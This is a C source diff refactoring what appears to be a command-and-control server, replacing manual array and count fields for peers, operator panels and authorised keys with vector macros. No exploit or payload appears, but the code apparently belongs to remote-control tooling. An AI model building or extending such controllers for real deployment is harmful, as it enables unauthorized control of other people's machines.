@@ -161,12 +161,8 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port)
     /* init peer hashmap & panel list */
     cnc->peers = hashmap_new(sizeof(tCNC_PeerHashElem), 8, 0, 0, cnc_PeerElemHash,
                              cnc_PeerElemCompare, NULL, NULL);
-    cnc->authPeers = NULL;
-    cnc->authKeys = NULL;
-    cnc->authKeysCount = 0;
-    cnc->authKeysCap = 4;
-    cnc->authPeersCap = 4;
-    cnc->authPeersCount = 0;
+    laikaM_initVector(cnc->authPeers, 4);
+    laikaM_initVector(cnc->authKeys, 4);
     cnc->port = port;
 
     /* init socket (we just need it for the raw socket fd and abstracted API :P) & pollList */
@@ -207,7 +203,7 @@ void laikaC_freeCNC(struct sLaika_cnc *cnc)
     hashmap_free(cnc->peers);
 
     /* free auth keys */
-    for (i = 0; i < cnc->authKeysCount; i++) {
+    for (i = 0; i < laikaM_countVector(cnc->authKeys); i++) {
         laikaM_free(cnc->authKeys[i]);
     }
     laikaM_free(cnc->authKeys);
@@ -222,7 +218,7 @@ void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
     hashmap_set(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
 
     /* notify connected panels of the newly connected peer */
-    for (i = 0; i < cnc->authPeersCount; i++) {
+    for (i = 0; i < laikaM_countVector(cnc->authPeers); i++) {
         laikaC_sendNewPeer(cnc->authPeers[i], peer);
     }
 
@@ -273,7 +269,7 @@ void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
     }
 
     /* notify connected panels of the disconnected peer */
-    for (i = 0; i < cnc->authPeersCount; i++) {
+    for (i = 0; i < laikaM_countVector(cnc->authPeers); i++) {
         laikaC_sendRmvPeer(cnc->authPeers[i], peer);
     }
 
@@ -316,11 +312,10 @@ void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTY
 void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
 {
     /* grow array if we need to */
-    laikaM_growarray(struct sLaika_peer *, cnc->authPeers, 1, cnc->authPeersCount,
-                     cnc->authPeersCap);
+    laikaM_growVector(struct sLaika_peer *, cnc->authPeers, 1);
 
     /* insert into authenticated peer table */
-    cnc->authPeers[cnc->authPeersCount++] = authPeer;
+    cnc->authPeers[laikaM_countVector(cnc->authPeers)++] = authPeer;
 
     LAIKA_DEBUG("added panel %p!\n", authPeer);
 }
@@ -329,9 +324,9 @@ void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
 {
     int i;
 
-    for (i = 0; i < cnc->authPeersCount; i++) {
+    for (i = 0; i < laikaM_countVector(cnc->authPeers); i++) {
         if (cnc->authPeers[i] == authPeer) { /* we found the index for our panel! */
-            laikaM_rmvarray(cnc->authPeers, cnc->authPeersCount, i, 1);
+            laikaM_rmvVector(cnc->authPeers, i, 1);
             return;
         }
     }
@@ -340,14 +335,14 @@ void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
 void laikaC_addAuthKey(struct sLaika_cnc *cnc, const char *key)
 {
     uint8_t *buf;
-    laikaM_growarray(uint8_t *, cnc->authKeys, 1, cnc->authKeysCount, cnc->authKeysCap);
+    laikaM_growVector(uint8_t *, cnc->authKeys, 1);
 
     buf = laikaM_malloc(crypto_kx_PUBLICKEYBYTES);
     if (!laikaK_loadKeys(buf, NULL, key, NULL))
         LAIKA_ERROR("Failed to load key '%s'\n", key);
 
     /* insert key */
-    cnc->authKeys[cnc->authKeysCount++] = buf;
+    cnc->authKeys[laikaM_countVector(cnc->authKeys)++] = buf;
     printf("[~] Added authenticated public key '%s'\n", key);
 }
 
